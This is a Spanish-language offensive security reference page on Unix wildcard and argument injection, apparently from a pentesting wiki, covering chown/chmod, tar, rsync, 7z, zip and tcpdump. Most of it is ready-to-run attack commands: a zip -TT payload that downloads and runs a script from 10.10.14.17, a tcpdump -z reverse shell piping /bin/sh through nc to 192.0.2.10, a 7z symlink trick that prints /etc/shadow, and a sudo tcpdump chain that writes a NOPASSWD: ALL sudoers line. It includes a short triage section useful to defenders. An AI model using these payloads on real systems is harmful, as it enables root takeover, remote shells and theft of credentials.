# Trucos adicionales de Wildcards

> La **inyección de argumentos** mediante Wildcards (también llamados *globs*) ocurre cuando un script con privilegios ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard sin comillas como `*`.
> Como el shell expande el wildcard **antes** de ejecutar el binario, un atacante que pueda crear archivos en el directorio de trabajo puede crear nombres de archivo que comiencen con `-`, de modo que se interpreten como **opciones en lugar de datos**, introduciendo de forma efectiva flags arbitrarios o incluso comandos.<sup>[[6]](#references)</sup>
> Esta página recopila las primitives más útiles, investigaciones recientes y detecciones modernas de 2023-2025.

## chown / chmod

Puedes **copiar el propietario/grupo o los bits de permisos de un archivo de referencia** abusando del flag `--reference` cuando un nombre de archivo que parece una opción se expande mediante un wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Cuando root ejecute posteriormente algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
La opción expandida `--reference=.drf.php` anula el owner/mode explícito, haciendo que los archivos coincidentes hereden los metadatos de `.drf.php` (y, con la configuración anterior, haciendo que el atacante pueda escribir en ellos).<sup>[[6]](#references)</sup>

*PoC y tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).<sup>[[7]](#references)</sup>
Consulta también el clásico paper de DefenseCode para obtener más detalles.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Ejecuta comandos arbitrarios abusando de la feature de **checkpoint** de GNU tar y de las acciones de checkpoint.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Una vez que root ejecuta, por ejemplo, `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.<sup>[[10]](#references)</sup>

### Advertencia sobre la sustitución del compresor de bsdtar / macOS

El `tar` predeterminado en las versiones recientes de macOS (basado en `libarchive`) no proporciona la interfaz `--checkpoint` de GNU tar, pero bsdtar documenta **--use-compress-program** para seleccionar un compresor externo.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, esto selecciona `sh` mediante el `PATH` de la víctima y bsdtar lo inicia como compresor.<sup>[[11]](#references)</sup> Esto demuestra la inyección de opciones, pero no constituye por sí solo una primitiva fiable de ejecución de comandos arbitrarios: un nombre de archivo creado mediante un wildcard no puede contener `/`, y bsdtar proporciona datos del archivo en lugar de un comando de shell seleccionado por el atacante. La ejecución de código requiere además un ejecutable controlable resuelto mediante `PATH` u otro canal de argumentos que permita especificar un programa útil.

---

## rsync

`rsync` permite sobrescribir el shell remoto o el binario remoto mediante flags de línea de comandos como `-e` y `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si posteriormente root archiva el directorio con `rsync -az * backup:/srv/`, el flag inyectado puede ejecutar un shell mediante el mecanismo de remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modo `rsync`).

---

## 7-Zip / 7z / 7za

Incluso cuando el script privilegiado antepone *defensivamente* `--` al wildcard (para detener el análisis de opciones), la CLI de 7-Zip acepta **archivos de lista de archivos** anteponiendo `@` al nombre de archivo. Combinar esto con un symlink permite *exfiltrar archivos arbitrarios*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root ejecuta algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y abortará, **imprimiendo el contenido en stderr**.<sup>[[13]](#references)</sup>

Esto sobrevive a `-- *` porque la CLI de 7-Zip acepta explícitamente tanto nombres de archivo normales como `@listfiles` como entradas posicionales, por lo que un nombre de archivo literal como `@root.txt` aún recibe un tratamiento especial.<sup>[[13]](#references)</sup>

---

## zip

Existen dos primitivas muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un wildcard o enumerando nombres sin `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` habilita “test archive” y `-TT <cmd>` reemplaza el tester por un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que comiencen con `-`, divide los flags entre nombres de archivo distintos para que funcione el análisis de short-options.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NO intentes usar un único nombre de archivo como `'-T -TT <cmd>'`: las opciones cortas se analizan carácter por carácter y fallará. Usa tokens separados como se muestra.<sup>[[3]](#references)</sup>
- Si la aplicación elimina las barras diagonales de los nombres de archivo, realiza la descarga desde un host/IP sin ruta (la ruta predeterminada es `/index.html`) y guárdala localmente con `-O`; después, ejecútala.<sup>[[3]](#references)</sup>
- Puedes depurar el análisis con `-sc` (muestra los argv procesados) o `-h2` (más ayuda) para comprender cómo se consumen tus tokens.<sup>[[3]](#references)</sup>

Ejemplo (comportamiento local en zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Si la capa web muestra la salida estándar/error estándar de `zip` (algo común en wrappers ingenuos), los flags inyectados como `--help` o los errores de opciones incorrectas aparecerán en la respuesta HTTP, confirmando la inyección de línea de comandos y ayudando a ajustar el payload.<sup>[[3]](#references)</sup>

---

## Candidatos adicionales para la inyección de opciones

Cuando un wrapper con privilegios expande un directorio escribible usando un wildcard, conviene comprobar estos hooks de opciones documentados.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Pasa una cadena de comandos a un shell |
| `git`   | `-c core.sshCommand=<cmd>` | Usa `<cmd>` en lugar de SSH para fetch/push de Git |
| `scp`   | `-S <program>` | Usa un programa de conexión alternativo compatible con SSH |

Estas primitivas son comprobaciones útiles más allá de los clásicos *tar/rsync/zip*.

---

## Búsqueda de wrappers y jobs vulnerables

Los estudios de caso recientes y las guías de detección muestran que la inyección de wildcard/argv ya no es solo un problema de **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> La misma clase de bug sigue apareciendo en:

- funciones web que "descargan todo como zip/tar" desde directorios de upload controlados por un atacante
- debug shells de proveedores o appliances que exponen un wrapper de **tcpdump** con campos de filename/filter controlados por un atacante
- jobs de backup o rotación que ejecutan `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` sobre directorios escribibles

Comandos útiles para el triage (la invocación de `pspy` utiliza sus flags documentados de proceso/eventos de archivos e intervalo).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heurísticas rápidas:

- `-- *` es una buena solución para muchas herramientas GNU, pero **no** para `7z`/`7za`, porque `@listfiles` se analizan por separado.<sup>[[13]](#references)</sup>
- Para `zip`, busca wrappers que enumeren directamente nombres de archivo controlados por el usuario; la división de opciones cortas (`-T` + `-TT <cmd>`) sigue funcionando incluso sin un shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Para `tcpdump`, presta especial atención a los wrappers que permiten controlar **nombres de archivos de salida**, **configuración de rotación** o argumentos de **reproducción de archivos de captura**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE mediante inyección de argv en wrappers

Cuando un shell restringido o un wrapper de un vendor construye una línea de comandos de `tcpdump` concatenando campos controlados por el usuario (por ejemplo, un parámetro de "file name") sin aplicar un quoting/validación estrictos, puedes introducir flags adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limitar el número de archivos) y `-z <cmd>` (comando posterior a la rotación) permite ejecutar comandos arbitrarios como el usuario que ejecuta tcpdump (a menudo root en appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Requisitos previos:

- Puedes influir en el `argv` pasado a `tcpdump` (por ejemplo, mediante un wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- El wrapper no sanitiza los espacios ni los tokens precedidos por `-` en el campo del nombre de archivo.<sup>[[4]](#references)</sup>

PoC clásica (ejecuta un script de reverse shell desde una ruta con permisos de escritura).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` rota cada segundo, y `-W 1` se detiene después de un archivo rotado; la captura debe recibir un paquete coincidente antes de la rotación.<sup>[[18]](#references)</sup>
- `-z <cmd>` ejecuta el comando post-rotate una vez por rotación y pasa la ruta del savefile cerrado como argumento; asegúrate de que el manejo de argumentos del script/intérprete coincida con tu payload.<sup>[[18]](#references)</sup>

Variantes sin medios extraíbles:

- Si tienes cualquier otra primitive para escribir archivos (por ejemplo, un wrapper de comandos independiente que permita la redirección de salida), coloca tu script en una ruta conocida y activa `-z /path/script.sh`; haz que el script invoque `/bin/sh` por sí mismo si es necesario.<sup>[[18]](#references)</sup>
- Si un wrapper del proveedor permite elegir la ruta rotada, audita ese control de ruta únicamente junto con un comando post-rotate que interprete su argumento savefile; el control de ruta por sí solo no ejecuta el contenido del archivo.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump con wildcards/argumentos adicionales → escritura/lectura arbitraria y root

Ejemplo de anti-pattern de sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
La regla deja varias opciones disponibles en el parser documentado de `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
- El glob `*` y los patrones permisivos solo restringen el primer argumento de `-w`. `tcpdump` acepta varias opciones `-w`; prevalece la última.<sup>[[3]](#references)[[18]](#references)</sup>
- La regla no restringe otras opciones, por lo que se permiten `-Z`, `-r`, `-V`, etc.<sup>[[3]](#references)[[18]](#references)</sup>

Las primitivas relevantes se documentan a continuación.<sup>[[3]](#references)[[18]](#references)</sup>
- Sobrescribir la ruta de destino con un segundo `-w` (el primero solo satisface sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dentro del primer `-w` para escapar del árbol restringido.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forzar la propiedad de salida con `-Z root` (crea archivos propiedad de root en cualquier lugar).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Escritura de contenido arbitrario reproduciendo un PCAP preparado mediante `-r` (por ejemplo, para añadir una línea a sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Crear un PCAP que contenga el payload ASCII exacto y escribirlo como root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lectura arbitraria de archivos/secret leak con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error suelen repetir líneas, haciendo leak de contenido.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: inyección de argumentos de Zip a RCE + privesc por una misconfiguración de sudo en tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Cadena de Exploit completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Posible Shell detectada mediante inyección de Wildcard](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Regreso al futuro: Wildcards de Unix fuera de control (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [Invocación de `chown` de GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [Invocación de `chmod` de GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Checkpoints de GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Manual de bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Manual de rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaxis de la línea de comandos de 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Manual de flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Documentación de configuración de Git](https://git-scm.com/docs/git-config)
- [17] [Manual de `scp` de OpenBSD](https://man.openbsd.org/scp)
- [18] [Manual de tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
